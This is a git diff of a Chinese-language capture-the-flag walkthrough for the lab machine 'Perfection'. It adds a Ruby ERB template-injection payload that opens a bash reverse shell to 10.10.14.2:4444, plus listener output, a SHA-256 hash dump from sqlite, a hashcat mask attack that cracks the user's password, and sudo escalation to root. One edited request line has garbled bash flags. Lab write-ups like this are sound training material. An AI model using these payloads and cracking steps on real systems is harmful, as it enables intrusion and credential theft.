@@ -109,8 +109,9 @@ category1=test1%0A<%2510%3d+IO.popen("sleep+10").readlines()+%25>&grade1=9&weigh
 ```
 nc -lnvp 4444
 ```
-#### 要注入的payload,按Ctrl+U
+#### 要注入的payload,按Ctrl+U,因为\n不方便转化，手动输入%0A
 ```
+test1
 <%= IO.popen("bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'").readlines() %>
 ```
 ```
@@ -130,5 +131,154 @@ Upgrade-Insecure-Requests: 1
 Sec-GPC: 1
 Priority: u=0, i
 
-category1=test1%0A<%25%3d+IO.popen("bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.2/4444+0>%261'").readlines()+%25>&grade1=8&weight1=30&category2=test2&grade2=9&weight2=30&category3=test3&grade3=8&weight3=40&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0
+category1=test1%0A<%25%3d+IO.popen("bash+c+'bash+i+>%26+/dev/tcp/10.10.14.2/4444+0>%261'").readlines()+%25>&grade1=8&weight1=30&category2=test2&grade2=9&weight2=30&category3=test3&grade3=8&weight3=40&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0
+```
+#### 有反弹了
+```
+[★]$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.149] from (UNKNOWN) [10.129.105.130] 42528
+bash: cannot set terminal process group (992): Inappropriate ioctl for device
+bash: no job control in this shell
+susan@perfection:~/ruby_app$ id
+id
+uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
+susan@perfection:~/ruby_app$ script /dev/null -c /bin/bash
+script /dev/null -c /bin/bash
+Script started, output log file is '/dev/null'.
+susan@perfection:~/ruby_app$ cat /home/susan/user.txt
+cat /home/susan/user.txt
+```
+### Privilege Escalation
+#### 我们看到用户susan在sudo组中。因为sudo需要密码，所以我们需要找到Susan用户的密码。
+#### 进一步的枚举显示susan在mail文件夹中有一封电子邮件：
+```
+susan@perfection:~/ruby_app$ ls -la /var/mail
+total 12
+drwxrwsr-x  2 root mail  4096 May 14  2023 .
+drwxr-xr-x 13 root root  4096 Oct 27  2023 ..
+-rw-r-----  1 root susan  625 May 14  2023 susan
+susan@perfection:~/ruby_app$ cat /var/mail/susan
+Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students
+
+in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:
+
+{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+Note that all letters of the first name should be convered into lowercase.
+
+Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
+
+- Tina, your delightful student
+```
+```
+由于学生路径数据泄露，我们将过渡到木星等级，我认为我们也应该迁移我们的证书（“我们的”包括其他学生）
+
+在我们搬到新的平台。我还建议一个新的密码规范，让每个人都更容易。密码格式为：
+
+{firstname}_{firstname倒写}_{随机生成的1到1,000,000,000之间的整数}
+
+请注意，名字中的所有字母都应转换为小写。
+
+如果可以，请告诉我迁移的最新情况。我目前正在平台上注册我们的大学。
+```
+#### 在susan用户的主目录中，有一个包含迁移数据库的文件夹（Migration）：
+```
+susan@perfection:~$ ls -la Migration/
+total 16
+drwxr-xr-x 2 root  root  4096 Oct 27  2023 .
+drwxr-x--- 7 susan susan 4096 Feb 26  2024 ..
+-rw-r--r-- 1 root  root  8192 May 14  2023 pupilpath_credentials.db
+```
+#### Migration文件夹包含了一个重要的文件：path_credentials.db有关从“瞳孔路径”到新系统过渡的数据。
+```
+susan@perfection:~/Migration$ sqlite3 pupilpath_credentials.db
+SQLite version 3.37.2 2022-01-06 13:25:41
+Enter ".help" for usage hints.
+sqlite> .tables
+users
+sqlite> select * from users;
+1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
+2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
+3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
+4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
+5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
+sqlite> .exit
+```
+#### 我们主要对Susan的密码散列感兴趣，以便进一步升级特权。长度的哈希值表明这些很可能是SHA-256哈希值。我们可以用我们机器上的哈希标识符：
+```
+[★]$ vi hash
+[★]$ cat hash
+1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
+2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
+3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
+4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
+5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
+[★]$ cat hash | cut -d '|' -f3 > hashes.txt
+[★]$ cat hashes.txt
+abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
+dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
+d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
+ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
+154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
+```
+```
+[★]$ while read -r H; do printf "%s\n" "$H"; hashid "$H"; echo; done < hashes.txt > hash_identify_results.txt
+```
+```
+[★]$ cat hash_identify_results.txt
+abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
+Analyzing 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f'
+[+] Snefru-256 
+[+] SHA-256 
+[+] RIPEMD-256 
+[+] Haval-256 
+[+] GOST R 34.11-94 
+[+] GOST CryptoPro S-Box 
+[+] SHA3-256 
+[+] Skein-256 
+[+] Skein-512(256) 
+<SNIP>
+```
+### Mask Attacks
+#### 掩码攻击用于生成匹配特定模式的单词。这种攻击是当密码长度或格式已知时特别有用。知道了密码的格式，我们可以创建一个以susan_nasus_开头的单词列表，附加每个9位数的模式，并对其进行散列，等等把它和苏珊的散列比较一下。生成的随机数有90%的可能性是一个9位数的数字，这就是为什么我们现在专注于9位数的数字。在Hashcat中使用模式6（将键空间中的每个候选项附加到数组中的每个单词）wordlist)，我们就能找到苏珊的密码
+```
+[★]$ hashcat -m 1400 -a 6 hash2 wl ?d?d?d?d?d?d?d?d?d -O
+<SNIP>
+abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1400 (SHA2-256)
+Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f
+Time.Started.....: Mon Sep 22 04:12:56 2025 (30 secs)
+Time.Estimated...: Mon Sep 22 04:13:26 2025 (0 secs)
+Kernel.Feature...: Optimized Kernel
+Guess.Base.......: File (wl), Left Side
+Guess.Mod........: Mask (?d?d?d?d?d?d?d?d?d) [9], Right Side
+Guess.Queue.Base.: 1/1 (100.00%)
+Guess.Queue.Mod..: 1/1 (100.00%)
+Speed.#2.........:  3995.5 kH/s (0.01ms) @ Accel:512 Loops:256 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 125967360/1000000000 (12.60%)
+Rejected.........: 0/125967360 (0.00%)
+Restore.Point....: 0/1 (0.00%)
+Restore.Sub.#2...: Salt:0 Amplifier:125967104-125967360 Iteration:0-256
+Candidate.Engine.: Device Generator
+Candidates.#2....: susan_nasus_981539210 -> susan_nasus_643759210
+```
+```
+-a 6：指定攻击模式，在这种情况下，一个组合子攻击，其中每个候选在关键字空格被附加到单词列表中的每个单词。
+hash：包含待破解哈希值的文件。
+wl：包含前缀susan_nasus_的wordlist文件。
+? d ? d ? d ? d ? d ? d ? d ? d ?d：表示9位数字所有组合的掩码。
+-O：优化的内核（对速度有用，但可能有限制）
+```
+#### 我们已经获得了密码susan_nasus_413759210，现在我们尝试使用它来运行sudo将我们的权限升级为root
+```
+susan@perfection:~/Migration$ sudo -i
+sudo -i
+[sudo] password for susan: susan_nasus_413759210
+
+root@perfection:~# cat /root/root.txt
 ```
